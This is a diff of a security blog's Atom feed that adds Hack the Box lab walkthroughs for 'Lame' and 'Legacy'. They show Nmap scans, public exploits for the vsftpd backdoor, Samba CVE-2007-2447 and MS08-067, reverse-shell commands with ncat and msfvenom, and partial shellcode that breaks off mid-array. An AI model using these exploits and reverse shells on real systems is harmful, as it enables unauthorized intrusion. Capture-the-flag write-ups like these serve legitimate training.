@@ -1,5 +1,503 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>LogistyxCat</title><link href="https://logistyxcat.github.io/" rel="alternate"></link><link href="https://logistyxcat.github.io%5Cfeeds/all.atom.xml" rel="self"></link><id>https://logistyxcat.github.io/</id><updated>2020-02-05T00:00:00-08:00</updated><entry><title>Active - Hack the Box</title><link href="https://logistyxcat.github.io%5Chtb-active.html" rel="alternate"></link><published>2018-12-08T00:00:00-08:00</published><updated>2020-02-05T00:00:00-08:00</updated><author><name>Riley</name></author><id>tag:logistyxcat.github.io\htb-active.html,2018-12-08:</id><summary type="html">&lt;p&gt;Guide to Active from Hack the Box, featuring a Kerberoast attack.&lt;/p&gt;</summary><content type="html">&lt;h2&gt;Description&lt;/h2&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>LogistyxCat</title><link href="https://logistyxcat.github.io/" rel="alternate"></link><link href="https://logistyxcat.github.io%5Cfeeds/all.atom.xml" rel="self"></link><id>https://logistyxcat.github.io/</id><updated>2020-02-13T00:00:00-08:00</updated><entry><title>Lame - Hack the Box</title><link href="https://logistyxcat.github.io%5Chtb-lame.html" rel="alternate"></link><published>2020-02-13T00:00:00-08:00</published><updated>2020-02-13T00:00:00-08:00</updated><author><name>Riley</name></author><id>tag:logistyxcat.github.io\htb-lame.html,2020-02-13:</id><summary type="html">&lt;p&gt;Guide to Lame on Hack the Box.&lt;/p&gt;</summary><content type="html">&lt;h2&gt;Description&lt;/h2&gt;
+&lt;p&gt;Lame is one of the easiest boxes overall, with a Samba SMB server exploit to instant root and a red herring.&lt;/p&gt;
+&lt;p&gt;Lame is assigned IP 10.10.10.3.&lt;/p&gt;
+&lt;h2&gt;Reconnaissance&lt;/h2&gt;
+&lt;p&gt;We begin by initiating an Nmap scan.&lt;/p&gt;
+&lt;h4&gt;Nmap&lt;/h4&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# nmap -sV -sC -oA nmap/Lame 10.10.10.3&lt;/span&gt;
+
+Nmap scan report &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="m"&gt;10&lt;/span&gt;.10.10.3
+Host is up &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;.085s latency&lt;span class="o"&gt;)&lt;/span&gt;.
+Not shown: &lt;span class="m"&gt;996&lt;/span&gt; filtered ports
+PORT    STATE SERVICE     VERSION
+&lt;span class="m"&gt;21&lt;/span&gt;/tcp  open  ftp         vsftpd &lt;span class="m"&gt;2&lt;/span&gt;.3.4
+&lt;span class="p"&gt;|&lt;/span&gt;_ftp-anon: Anonymous FTP login allowed &lt;span class="o"&gt;(&lt;/span&gt;FTP code &lt;span class="m"&gt;230&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;span class="p"&gt;|&lt;/span&gt; ftp-syst: 
+&lt;span class="p"&gt;|&lt;/span&gt;   STAT: 
+&lt;span class="p"&gt;|&lt;/span&gt; FTP server status:
+&lt;span class="p"&gt;|&lt;/span&gt;      Connected to &lt;span class="m"&gt;10&lt;/span&gt;.10.14.8
+&lt;span class="p"&gt;|&lt;/span&gt;      Logged in as ftp
+&lt;span class="p"&gt;|&lt;/span&gt;      TYPE: ASCII
+&lt;span class="p"&gt;|&lt;/span&gt;      No session bandwidth limit
+&lt;span class="p"&gt;|&lt;/span&gt;      Session timeout in seconds is &lt;span class="m"&gt;300&lt;/span&gt;
+&lt;span class="p"&gt;|&lt;/span&gt;      Control connection is plain text
+&lt;span class="p"&gt;|&lt;/span&gt;      Data connections will be plain text
+&lt;span class="p"&gt;|&lt;/span&gt;      vsFTPd &lt;span class="m"&gt;2&lt;/span&gt;.3.4 - secure, fast, stable
+&lt;span class="p"&gt;|&lt;/span&gt;_End of status
+&lt;span class="m"&gt;22&lt;/span&gt;/tcp  open  ssh         OpenSSH &lt;span class="m"&gt;4&lt;/span&gt;.7p1 Debian 8ubuntu1 &lt;span class="o"&gt;(&lt;/span&gt;protocol &lt;span class="m"&gt;2&lt;/span&gt;.0&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;span class="p"&gt;|&lt;/span&gt; ssh-hostkey: 
+&lt;span class="p"&gt;|&lt;/span&gt;   &lt;span class="m"&gt;1024&lt;/span&gt; &lt;span class="m"&gt;60&lt;/span&gt;:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd &lt;span class="o"&gt;(&lt;/span&gt;DSA&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;span class="p"&gt;|&lt;/span&gt;_  &lt;span class="m"&gt;2048&lt;/span&gt; &lt;span class="m"&gt;56&lt;/span&gt;:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 &lt;span class="o"&gt;(&lt;/span&gt;RSA&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;span class="m"&gt;139&lt;/span&gt;/tcp open  netbios-ssn Samba smbd &lt;span class="m"&gt;3&lt;/span&gt;.X - &lt;span class="m"&gt;4&lt;/span&gt;.X &lt;span class="o"&gt;(&lt;/span&gt;workgroup: WORKGROUP&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;span class="m"&gt;445&lt;/span&gt;/tcp open  netbios-ssn Samba smbd &lt;span class="m"&gt;3&lt;/span&gt;.X - &lt;span class="m"&gt;4&lt;/span&gt;.X &lt;span class="o"&gt;(&lt;/span&gt;workgroup: WORKGROUP&lt;span class="o"&gt;)&lt;/span&gt;
+Service Info: OSs: Unix, Linux&lt;span class="p"&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+&lt;span class="p"&gt;|&lt;/span&gt;_ms-sql-info: ERROR: Script execution failed &lt;span class="o"&gt;(&lt;/span&gt;use -d to debug&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;span class="p"&gt;|&lt;/span&gt;_smb-os-discovery: ERROR: Script execution failed &lt;span class="o"&gt;(&lt;/span&gt;use -d to debug&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;span class="p"&gt;|&lt;/span&gt;_smb-security-mode: ERROR: Script execution failed &lt;span class="o"&gt;(&lt;/span&gt;use -d to debug&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;span class="p"&gt;|&lt;/span&gt;_smb2-time: Protocol negotiation failed &lt;span class="o"&gt;(&lt;/span&gt;SMB2&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h2&gt;VSFTP, The Red Herring&lt;/h2&gt;
+&lt;p&gt;The first item to jump out is the &lt;code&gt;vsftpd 2.3.4&lt;/code&gt; server.  This version of the software has a well known backdoor, &lt;a href="https://www.exploit-db.com/exploits/17491"&gt;EDB-ID 17941&lt;/a&gt;.  I located a public PoC, published by In2econd on &lt;a href="https://github.com/In2econd/vsftpd-2.3.4-exploit/blob/master/vsftpd_234_exploit.py"&gt;GitHub&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;The exploit triggers the backdoor, which waits on port 6200 for commands.&lt;/p&gt;
+&lt;h4&gt;vsftpd_234_exploit.py&lt;/h4&gt;
+&lt;p&gt;&lt;code&gt;python3 ./vsftpd_234_exploit.py 10.10.10.3 21 whoami&lt;/code&gt;
+&lt;img alt="Exploit failed on connection to backdoor" src="images\ctf\htb\lame\vsftpd_exploit_failed.png"&gt;&lt;/p&gt;
+&lt;p&gt;As you can see, the exploit did execute, but we could not connect to the backdoor port.  Either the software was patched, or there is a firewall blocking connections to miscellaneous ports.  Nmap reports that the port is filtered, so my guess is the latter.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Filtered port means filtered progress" src="images\ctf\htb\lame\vsftpd_verify_backdoor_state.png"&gt;&lt;/p&gt;
+&lt;h2&gt;Investigating Samba&lt;/h2&gt;
+&lt;p&gt;Since vsftp isn't an option, the remaining attack paths are either SSH or the Samba server.  Cursory research indicates that this version of OpenSSH doesn't have any significant exploits, and Nmap unfortunately failed to identify the exact version of Samba currently running.  Other utilities such as enum4linux also fail to identify the service sersion.&lt;/p&gt;
+&lt;p&gt;Metasploit has a module for this, &lt;code&gt;auxiliary/scanner/smb/smb_version&lt;/code&gt;, that appearently does have some success in identifying the service.  I can also locate the version in a packet dump when using various utilities such as smbmap.  The commands I used are listed below.&lt;/p&gt;
+&lt;p&gt;msfconsole: &lt;code&gt;msfconsole -q -x 'use auxiliary/scanner/smb/smb_version; set RHOSTS 10.10.10.3; exploit; exit'&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;tcpdump:    &lt;code&gt;tcpdump -nn -s0 -X -i tun0 host 10.10.10.3 &amp;amp;&amp;amp; port 445&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Finally a service version!" src="images\ctf\htb\lame\smb_identifying_version.png"&gt;&lt;/p&gt;
+&lt;p&gt;Unix Samba 3.0.20-Debian has a Remote Code Execution vulnerability assigned &lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2007-2447"&gt;CVE-2007-2447&lt;/a&gt; that allows arbitrary execution of commands in the username field.&lt;/p&gt;
+&lt;p&gt;Github user &lt;em&gt;amiriunix&lt;/em&gt; made a &lt;a href="https://github.com/amriunix/CVE-2007-2447"&gt;great Python PoC&lt;/a&gt; for this vulnerability.  After downloading, one should only need to install the python2 module &lt;code&gt;pysmb&lt;/code&gt; to make it functional.  This should be as simple as &lt;code&gt;sudo pip2 install pysmb&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;The instructions on the command is executed as such as thi:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gu"&gt;##&lt;/span&gt; Usage:
+
+shell
+$ python usermap_script.py &amp;lt;RHOST&amp;gt; &amp;lt;RPORT&amp;gt; &amp;lt;LHOST&amp;gt; &amp;lt;LPORT&amp;gt;
+
+  &lt;span class="k"&gt;*&lt;/span&gt; &lt;span class="sb"&gt;`RHOST`&lt;/span&gt; -- The target address
+  &lt;span class="k"&gt;*&lt;/span&gt; &lt;span class="sb"&gt;`RPORT`&lt;/span&gt; -- The target port (TCP : 139)
+  &lt;span class="k"&gt;*&lt;/span&gt; &lt;span class="sb"&gt;`LHOST`&lt;/span&gt; -- The listen address
+  &lt;span class="k"&gt;*&lt;/span&gt; &lt;span class="sb"&gt;`LPORT`&lt;/span&gt; -- The listen port
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;After executing, it should create a reverse shell back to our machine.  First, we create a listener using Ncat (or something similar):&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# rlwrap ncat -nvlp 8080&lt;/span&gt;
+Ncat: Version &lt;span class="m"&gt;7&lt;/span&gt;.80 &lt;span class="o"&gt;(&lt;/span&gt; https://nmap.org/ncat &lt;span class="o"&gt;)&lt;/span&gt;
+Ncat: Listening on :::8080
+Ncat: Listening on &lt;span class="m"&gt;0&lt;/span&gt;.0.0.0:8080
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The command then should look like this:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# python ./usermap_script.py 10.10.10.3 139 10.10.14.33 8080&lt;/span&gt;
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; CVE-2007-2447 - Samba usermap script
+&lt;span class="o"&gt;[&lt;/span&gt;+&lt;span class="o"&gt;]&lt;/span&gt; Connecting !
+&lt;span class="o"&gt;[&lt;/span&gt;+&lt;span class="o"&gt;]&lt;/span&gt; Payload was sent - check netcat !
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Back in our Ncat terminal:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Ncat: Connection from &lt;span class="m"&gt;10&lt;/span&gt;.10.10.3.
+Ncat: Connection from &lt;span class="m"&gt;10&lt;/span&gt;.10.10.3:37042.
+whoami &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; hostname
+root
+lame
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Excellent!  A root level reverse shell.  From this point, we can upgrade to a terminal with Python (this trick and more are discussed &lt;a href="https://medium.com/bugbountywriteup/pimp-my-shell-5-ways-to-upgrade-a-netcat-shell-ecd551a180d2"&gt;here&lt;/a&gt;) and locate the 2 flags.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;which python
+/usr/bin/python
+python -c &lt;span class="s1"&gt;&amp;#39;import pty; pty.spawn(&amp;quot;/bin/bash&amp;quot;)&amp;#39;&lt;/span&gt;
+root@lame:/# ls /home
+ls /home
+ftp  makis  service  user
+root@lame:/# ls -l /home/*/user.txt
+ls -l /home/*/user.txt
+-rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; makis makis &lt;span class="m"&gt;33&lt;/span&gt; Mar &lt;span class="m"&gt;14&lt;/span&gt;  &lt;span class="m"&gt;2017&lt;/span&gt; /home/makis/user.txt
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;This concludes the Lame walkthrough.  Thanks for reading!&lt;/p&gt;</content><category term="ctf"></category><category term="ctf"></category><category term="hack the box"></category><category term="oscp prep"></category></entry><entry><title>Legacy - Hack the Box</title><link href="https://logistyxcat.github.io%5Chtb-legacy.html" rel="alternate"></link><published>2020-02-13T00:00:00-08:00</published><updated>2020-02-13T00:00:00-08:00</updated><author><name>Riley</name></author><id>tag:logistyxcat.github.io\htb-legacy.html,2020-02-13:</id><summary type="html">&lt;p&gt;Guide to Legacy on Hack the Box.&lt;/p&gt;</summary><content type="html">&lt;h2&gt;Description&lt;/h2&gt;
+&lt;p&gt;Legacy is a  Windows XP machine with a straight shot to system using a well-known SMB exploit.&lt;/p&gt;
+&lt;p&gt;Legacy is assigned IP 10.10.10.4.&lt;/p&gt;
+&lt;h2&gt;Reconnaissance&lt;/h2&gt;
+&lt;p&gt;We begin by initiating an Nmap scan.&lt;/p&gt;
+&lt;h4&gt;Nmap&lt;/h4&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# nmap -sC -sV -oA nmap/Legacy 10.10.10.4&lt;/span&gt;
+
+Nmap scan report &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="m"&gt;10&lt;/span&gt;.10.10.4
+Host is up &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;.094s latency&lt;span class="o"&gt;)&lt;/span&gt;.
+Not shown: &lt;span class="m"&gt;997&lt;/span&gt; filtered ports
+PORT     STATE  SERVICE       VERSION
+&lt;span class="m"&gt;139&lt;/span&gt;/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
+&lt;span class="m"&gt;445&lt;/span&gt;/tcp  open   microsoft-ds  Windows XP microsoft-ds
+&lt;span class="m"&gt;3389&lt;/span&gt;/tcp closed ms-wbt-server
+Service Info: OSs: Windows, Windows XP&lt;span class="p"&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp
+
+Host script results:
+&lt;span class="p"&gt;|&lt;/span&gt;_clock-skew: mean: -3h58m09s, deviation: 1h24m51s, median: -4h58m09s
+&lt;span class="p"&gt;|&lt;/span&gt;_nbstat: NetBIOS name: LEGACY, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: &lt;span class="m"&gt;00&lt;/span&gt;:50:56:b9:7c:12 &lt;span class="o"&gt;(&lt;/span&gt;VMware&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;span class="p"&gt;|&lt;/span&gt; smb-os-discovery: 
+&lt;span class="p"&gt;|&lt;/span&gt;   OS: Windows XP &lt;span class="o"&gt;(&lt;/span&gt;Windows &lt;span class="m"&gt;2000&lt;/span&gt; LAN Manager&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;span class="p"&gt;|&lt;/span&gt;   OS CPE: cpe:/o:microsoft:windows_xp::-
+&lt;span class="p"&gt;|&lt;/span&gt;   Computer name: legacy
+&lt;span class="p"&gt;|&lt;/span&gt;   NetBIOS computer name: LEGACY&lt;span class="se"&gt;\x&lt;/span&gt;&lt;span class="m"&gt;00&lt;/span&gt;
+&lt;span class="p"&gt;|&lt;/span&gt;   Workgroup: HTB&lt;span class="se"&gt;\x&lt;/span&gt;&lt;span class="m"&gt;00&lt;/span&gt;
+&lt;span class="p"&gt;|&lt;/span&gt;_  System time: &lt;span class="m"&gt;2020&lt;/span&gt;-02-12T02:36:03+02:00
+&lt;span class="p"&gt;|&lt;/span&gt; smb-security-mode: 
+&lt;span class="p"&gt;|&lt;/span&gt;   account_used: &amp;lt;blank&amp;gt;
+&lt;span class="p"&gt;|&lt;/span&gt;   authentication_level: user
+&lt;span class="p"&gt;|&lt;/span&gt;   challenge_response: supported
+&lt;span class="p"&gt;|&lt;/span&gt;_  message_signing: disabled &lt;span class="o"&gt;(&lt;/span&gt;dangerous, but default&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;span class="p"&gt;|&lt;/span&gt;_smb2-time: Protocol negotiation failed &lt;span class="o"&gt;(&lt;/span&gt;SMB2&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The operating system appears to be Windows XP.  XP has several known vulnerabilities, many for the SMB protocol.  To get more information, we can use the Nmap Scripting Engine (NSE) scripts.  We can locate them with the &lt;code&gt;locate&lt;/code&gt; command.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# locate .nse | head&lt;/span&gt;
+/usr/share/exploitdb/exploits/hardware/webapps/31527.nse
+/usr/share/exploitdb/exploits/multiple/remote/33310.nse
+/usr/share/nmap/scripts/acarsd-info.nse
+/usr/share/nmap/scripts/address-info.nse
+/usr/share/nmap/scripts/afp-brute.nse
+/usr/share/nmap/scripts/afp-ls.nse
+/usr/share/nmap/scripts/afp-path-vuln.nse
+/usr/share/nmap/scripts/afp-serverinfo.nse
+/usr/share/nmap/scripts/afp-showmount.nse
+/usr/share/nmap/scripts/ajp-auth.nse
+&lt;span class="o"&gt;[&lt;/span&gt;SNIP...&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;All the NSE scripts we need are located in the &lt;code&gt;/usr/share/nmap/scripts/&lt;/code&gt; directory.  We can locate SMB vulnerability checkers by filtering the contents of the directory.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# ls /usr/share/nmap/scripts/ | grep smb | grep vuln&lt;/span&gt;
+smb2-vuln-uptime.nse
+smb-vuln-conficker.nse
+smb-vuln-cve2009-3103.nse
+smb-vuln-cve-2017-7494.nse
+smb-vuln-ms06-025.nse
+smb-vuln-ms07-029.nse
+smb-vuln-ms08-067.nse
+smb-vuln-ms10-054.nse
+smb-vuln-ms10-061.nse
+smb-vuln-ms17-010.nse
+smb-vuln-regsvc-dos.nse
+smb-vuln-webexec.nse
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Perfect!  To use a script with nmap, we need to set the &lt;code&gt;--script&lt;/code&gt; flag, like below.  It can accept wildcards as input, which is extremely useful for identifying all of the above scripts.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# nmap -p 139 -sV --script=smb-vuln* 10.10.10.4&lt;/span&gt;
+
+Nmap scan report &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="m"&gt;10&lt;/span&gt;.10.10.4
+Host is up &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;.085s latency&lt;span class="o"&gt;)&lt;/span&gt;.
+
+PORT    STATE SERVICE     VERSION
+&lt;span class="m"&gt;139&lt;/span&gt;/tcp open  netbios-ssn Microsoft Windows netbios-ssn
+Service Info: OS: Windows&lt;span class="p"&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+&lt;span class="p"&gt;|&lt;/span&gt; smb-vuln-ms08-067: 
+&lt;span class="p"&gt;|&lt;/span&gt;   VULNERABLE:
+&lt;span class="p"&gt;|&lt;/span&gt;   Microsoft Windows system vulnerable to remote code execution &lt;span class="o"&gt;(&lt;/span&gt;MS08-067&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;span class="p"&gt;|&lt;/span&gt;     State: VULNERABLE
+&lt;span class="p"&gt;|&lt;/span&gt;     IDs:  CVE:CVE-2008-4250
+&lt;span class="p"&gt;|&lt;/span&gt;           The Server service in Microsoft Windows &lt;span class="m"&gt;2000&lt;/span&gt; SP4, XP SP2 and SP3, Server &lt;span class="m"&gt;2003&lt;/span&gt; SP1 and SP2,
+&lt;span class="p"&gt;|&lt;/span&gt;           Vista Gold and SP1, Server &lt;span class="m"&gt;2008&lt;/span&gt;, and &lt;span class="m"&gt;7&lt;/span&gt; Pre-Beta allows remote attackers to execute arbitrary
+&lt;span class="p"&gt;|&lt;/span&gt;           code via a crafted RPC request that triggers the overflow during path canonicalization.
+&lt;span class="p"&gt;|&lt;/span&gt;           
+&lt;span class="p"&gt;|&lt;/span&gt;     Disclosure date: &lt;span class="m"&gt;2008&lt;/span&gt;-10-23
+&lt;span class="p"&gt;|&lt;/span&gt;     References:
+&lt;span class="p"&gt;|&lt;/span&gt;       https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
+&lt;span class="p"&gt;|&lt;/span&gt;_      https://cve.mitre.org/cgi-bin/cvename.cgi?name&lt;span class="o"&gt;=&lt;/span&gt;CVE-2008-4250
+&lt;span class="p"&gt;|&lt;/span&gt;_smb-vuln-ms10-054: &lt;span class="nb"&gt;false&lt;/span&gt;
+&lt;span class="p"&gt;|&lt;/span&gt;_smb-vuln-ms10-061: ERROR: Script execution failed &lt;span class="o"&gt;(&lt;/span&gt;use -d to debug&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;span class="p"&gt;|&lt;/span&gt; smb-vuln-ms17-010: 
+&lt;span class="p"&gt;|&lt;/span&gt;   VULNERABLE:
+&lt;span class="p"&gt;|&lt;/span&gt;   Remote Code Execution vulnerability in Microsoft SMBv1 servers &lt;span class="o"&gt;(&lt;/span&gt;ms17-010&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;span class="p"&gt;|&lt;/span&gt;     State: VULNERABLE
+&lt;span class="p"&gt;|&lt;/span&gt;     IDs:  CVE:CVE-2017-0143
+&lt;span class="p"&gt;|&lt;/span&gt;     Risk factor: HIGH
+&lt;span class="p"&gt;|&lt;/span&gt;       A critical remote code execution vulnerability exists in Microsoft SMBv1
+&lt;span class="p"&gt;|&lt;/span&gt;        servers &lt;span class="o"&gt;(&lt;/span&gt;ms17-010&lt;span class="o"&gt;)&lt;/span&gt;.
+&lt;span class="p"&gt;|&lt;/span&gt;           
+&lt;span class="p"&gt;|&lt;/span&gt;     Disclosure date: &lt;span class="m"&gt;2017&lt;/span&gt;-03-14
+&lt;span class="p"&gt;|&lt;/span&gt;     References:
+&lt;span class="p"&gt;|&lt;/span&gt;       https://cve.mitre.org/cgi-bin/cvename.cgi?name&lt;span class="o"&gt;=&lt;/span&gt;CVE-2017-0143
+&lt;span class="p"&gt;|&lt;/span&gt;       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+&lt;span class="p"&gt;|&lt;/span&gt;_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The box appears to be vulnerable to both &lt;a href="https://docs.microsoft.com/en-us/security-updates/securitybulletins/2008/ms08-067"&gt;ms08-067&lt;/a&gt; and &lt;a href="https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010"&gt;ms17-010&lt;/a&gt;.  These are both worth investigating, but this post will cover ms08-067.&lt;/p&gt;
+&lt;h2&gt;Getting System with ms08-067&lt;/h2&gt;
+&lt;p&gt;Some browsing reveals a nice &lt;a href="https://github.com/andyacer/ms08_067"&gt;Github repo&lt;/a&gt; for ms08-067 hosted by Github user &lt;em&gt;andyacer&lt;/em&gt;.  The README states that we need Impacket 0_9_17, and helpfully provides the instructions on installing it:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;git clone --branch impacket_0_9_17 --single-branch https://github.com/CoreSecurity/impacket/
+&lt;span class="nb"&gt;cd&lt;/span&gt; impacket
+pip install .
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Then we can clone the exploit repository.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# git clone https://github.com/andyacer/ms08_067&lt;/span&gt;
+Cloning into &lt;span class="s1"&gt;&amp;#39;ms08_067&amp;#39;&lt;/span&gt;...
+remote: Enumerating objects: &lt;span class="m"&gt;37&lt;/span&gt;, &lt;span class="k"&gt;done&lt;/span&gt;.
+remote: Total &lt;span class="m"&gt;37&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;delta &lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;, reused &lt;span class="m"&gt;0&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;delta &lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;, pack-reused &lt;span class="m"&gt;37&lt;/span&gt;
+Unpacking objects: &lt;span class="m"&gt;100&lt;/span&gt;% &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;37&lt;/span&gt;/37&lt;span class="o"&gt;)&lt;/span&gt;, &lt;span class="m"&gt;13&lt;/span&gt;.00 KiB &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="m"&gt;2&lt;/span&gt;.60 MiB/s, &lt;span class="k"&gt;done&lt;/span&gt;.
+&lt;span class="c1"&gt;# cd ms08_067/&lt;/span&gt;
+/ms08_067# ls
+LICENSE  ms08_067_2018.py  README.md
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Based on the source code, we will need to generate our own shellcode that the exploit will execute.  The script provides some sample commands for &lt;code&gt;msfvenom&lt;/code&gt;.&lt;/p&gt;
+&lt;h4&gt;ms08-067.py shellcode section&lt;/h4&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# ------------------------------------------------------------------------&lt;/span&gt;
+&lt;span class="c1"&gt;# REPLACE THIS SHELLCODE with shellcode generated for your use&lt;/span&gt;
+&lt;span class="c1"&gt;# Note that length checking logic follows this section, so there&amp;#39;s no need to count bytes or bother with NOPS.&lt;/span&gt;
+&lt;span class="c1"&gt;#&lt;/span&gt;
+&lt;span class="c1"&gt;# Example msfvenom commands to generate shellcode:&lt;/span&gt;
+&lt;span class="c1"&gt;# msfvenom -p windows/shell_bind_tcp RHOST=10.11.1.229 LPORT=443 EXITFUNC=thread -b &amp;quot;\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40&amp;quot; -f c -a x86 --platform windows&lt;/span&gt;
+&lt;span class="c1"&gt;# msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.157 LPORT=443 EXITFUNC=thread -b &amp;quot;\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40&amp;quot; -f c -a x86 --platform windows&lt;/span&gt;
+&lt;span class="c1"&gt;# msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.157 LPORT=62000 EXITFUNC=thread -b &amp;quot;\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40&amp;quot; -f c -a x86 --platform windows&lt;/span&gt;
+
+&lt;span class="c1"&gt;# Reverse TCP to 10.11.0.157 port 62000:&lt;/span&gt;
+&lt;span class="n"&gt;shellcode&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
+&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x31\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x42\xf6\xc3\xef\x83\xee\xfc\xe2\xf4\xbe\x1e\x41\xef\x42\xf6&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xa3\x66\xa7\xc7\x03\x8b\xc9\xa6\xf3\x64\x10\xfa\x48\xbd\x56&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x7d\xb1\xc7\x4d\x41\x89\xc9\x73\x09\x6f\xd3\x23\x8a\xc1\xc3&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
